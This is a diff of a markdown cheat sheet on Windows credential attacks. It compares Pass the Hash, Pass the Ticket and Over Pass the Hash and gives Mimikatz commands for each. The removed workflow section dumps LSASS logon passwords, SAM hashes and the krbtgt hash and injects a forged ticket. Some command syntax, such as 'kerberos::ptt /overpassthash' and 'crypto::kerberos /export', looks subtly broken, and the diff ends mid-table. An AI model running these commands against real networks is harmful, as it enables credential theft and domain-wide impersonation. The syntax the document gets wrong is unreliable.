@@ -22,89 +22,43 @@ Below is a comprehensive table of **Mimikatz** commands for extracting **Kerbero
 
 Below is a table comparing **Pass the Hash**, **Pass the Ticket**, and **Over Pass the Hash** techniques, highlighting their differences, appropriate use cases, and example syntaxes.
 
-| **Technique**            | **Description & Differences**                                                                                                                                                                                                                               | **When to Use**                                                                                              | **Example Syntax**                                                                                                                                                  |
-|--------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| **Pass the Hash (PtH)**  | **Description:** Utilizes captured NTLM hashes to authenticate as a user without needing the plaintext password. <br> **Differences:** Relies on NTLM hash values; does not involve Kerberos tickets.                                                    | When only NTLM hashes are available and Kerberos tickets are not feasible. Ideal for environments primarily using NTLM authentication. | ```bash <br> # Using Mimikatz to pass the hash <br> sekurlsa::logonpasswords <br> sekurlsa::pth /user:Username /domain:DOMAIN /ntlm:HASH /run:cmd.exe <br> ``` |
-| **Pass the Ticket (PtT)**| **Description:** Involves the use of Kerberos ticket-granting tickets (TGTs) or service tickets to authenticate as a user. <br> **Differences:** Utilizes Kerberos tickets instead of NTLM hashes, allowing for more seamless authentication in Kerberos-enabled environments. | When Kerberos authentication is in use and you have access to valid Kerberos tickets. Suitable for environments where Kerberos is the primary authentication protocol. | ```bash <br> # Using Mimikatz to pass the ticket <br> kerberos::list <br> kerberos::ptt ticket.kirbi <br> ```                                                                  |
-| **Over Pass the Hash (Pass the Key)** | **Description:** An advanced technique that combines Pass the Hash and Pass the Ticket by extracting Kerberos keys from the system and using them to create forged Kerberos tickets. <br> **Differences:** Extends PtH by leveraging Kerberos keys to generate valid tickets, enabling broader access and impersonation capabilities. | When both NTLM hashes and Kerberos keys are available, and there is a need to create more sophisticated and flexible authentication tokens. Useful in complex environments requiring high-level impersonation. | ```bash <br> # Using Mimikatz to perform Over Pass the Hash <br> sekurlsa::logonpasswords <br> kerberos::ptt /overpassthash:<hash> /user:Username /domain:DOMAIN <br> ```  |
+| **Technique**                  | **Description & Differences**                                                                                                                                                                                                                         | **When to Use**                                                                                               | **Example Syntax**                                                                                             |
+|--------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
+| **Pass the Hash (PtH)**        | **Description:** Utilizes captured NTLM hashes to authenticate as a user without needing the plaintext password. <br> **Differences:** Relies on NTLM hash values; does not involve Kerberos tickets.                                                | When only NTLM hashes are available and Kerberos tickets are not feasible. Ideal for environments primarily using NTLM authentication. | ```plaintext<br>sekurlsa::logonpasswords<br>sekurlsa::pth /user:Username /domain:DOMAIN /ntlm:HASH /run:cmd.exe<br>``` |
+| **Pass the Ticket (PtT)**      | **Description:** Involves the use of Kerberos ticket-granting tickets (TGTs) or service tickets to authenticate as a user. <br> **Differences:** Utilizes Kerberos tickets instead of NTLM hashes, allowing for more seamless authentication in Kerberos-enabled environments. | When Kerberos authentication is in use and you have access to valid Kerberos tickets. Suitable for environments where Kerberos is the primary authentication protocol. | ```plaintext<br>kerberos::list<br>kerberos::ptt ticket.kirbi<br>```                                              |
+| **Over Pass the Hash (Pass the Key)** | **Description:** An advanced technique that combines Pass the Hash and Pass the Ticket by extracting Kerberos keys from the system and using them to create forged Kerberos tickets. <br> **Differences:** Extends PtH by leveraging Kerberos keys to generate valid tickets, enabling broader access and impersonation capabilities. | When both NTLM hashes and Kerberos keys are available, and there is a need to create more sophisticated and flexible authentication tokens. Useful in complex environments requiring high-level impersonation. | ```plaintext<br>sekurlsa::logonpasswords<br>kerberos::ptt /overpassthash:HASH /user:Username /domain:DOMAIN<br>```     |
 
 ---
 
-## **Detailed Explanation**
+## Detailed Explanation
 
-### **1. Pass the Hash (PtH)**
+### 1. Pass the Hash (PtH)
 - **Description:** Pass the Hash allows an attacker to authenticate as a user by using the NTLM hash of the user's password instead of the actual password. This technique is effective in environments where NTLM authentication is still prevalent.
 - **When to Use:** Use PtH in networks where NTLM is commonly used and Kerberos authentication is not enforced or available.
 - **Example Syntax:**
     ```plaintext
-    # Using Mimikatz to pass the hash
     sekurlsa::logonpasswords
     sekurlsa::pth /user:Username /domain:DOMAIN /ntlm:HASH /run:cmd.exe
     ```
 
-### **2. Pass the Ticket (PtT)**
+### 2. Pass the Ticket (PtT)
 - **Description:** Pass the Ticket leverages Kerberos tickets (TGTs or service tickets) to authenticate as a user. This method is suitable for environments that primarily use Kerberos for authentication.
 - **When to Use:** Employ PtT in Kerberos-enabled environments where you have access to valid Kerberos tickets, allowing for more seamless and integrated authentication.
 - **Example Syntax:**
     ```plaintext
-    # Using Mimikatz to pass the ticket
     kerberos::list
     kerberos::ptt ticket.kirbi
     ```
 
-### **3. Over Pass the Hash (Pass the Key)**
+### 3. Over Pass the Hash (Pass the Key)
 - **Description:** Over Pass the Hash is an advanced technique that combines aspects of both PtH and PtT. It involves extracting Kerberos keys from the system and using them to forge Kerberos tickets, thereby expanding the capabilities of user impersonation.
 - **When to Use:** Utilize Over Pass the Hash in complex environments where both NTLM hashes and Kerberos keys are accessible. This technique is useful for creating sophisticated authentication tokens and gaining broader access.
 - **Example Syntax:**
     ```plaintext
-    # Using Mimikatz to perform Over Pass the Hash
     sekurlsa::logonpasswords
-    kerberos::ptt /overpassthash:<hash> /user:Username /domain:DOMAIN
+    kerberos::ptt /overpassthash:HASH /user:Username /domain:DOMAIN
     ```
-
 ---
-
-## Comprehensive Example Workflow
-
-Here's an example workflow that combines multiple commands to extract NTLM hashes and Kerberos tickets:
-
-1. **Elevate Privileges:**
-    ```plaintext
-    privilege::debug
-    ```
-
-2. **Dump Credentials:**
-    ```plaintext
-    sekurlsa::logonpasswords
-    ```
-
-3. **List and Export Kerberos Tickets:**
-    ```plaintext
-    kerberos::list /export
-    ```
-
-4. **Export Kerberos Keys:**
-    ```plaintext
-    crypto::kerberos /export
-    ```
-
-5. **Dump NTLM Hashes:**
-    ```plaintext
-    lsadump::sam
-    ```
-
-6. **Dump krbtgt Hash:**
-    ```plaintext
-    lsadump::lsa /inject /name:krbtgt
-    ```
-
-7. **Inject a Kerberos Ticket:**
-    ```plaintext
-    kerberos::ptt evil_ticket.kirbi
-    ```
-
----
-
 # Kerberos Attack Techniques Comparison
 
 | **Technique**           | **What Is It?**                                                                                                                                                                                                 | **When to Use**                                                                                                                                                                                                          | **Why Use This Approach?**                                                                                                                                                                                                                                                                                                                                                                                                                                | **Basic Steps**                                                                                                                                                                                                                                       | **Example Commands/Tools**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
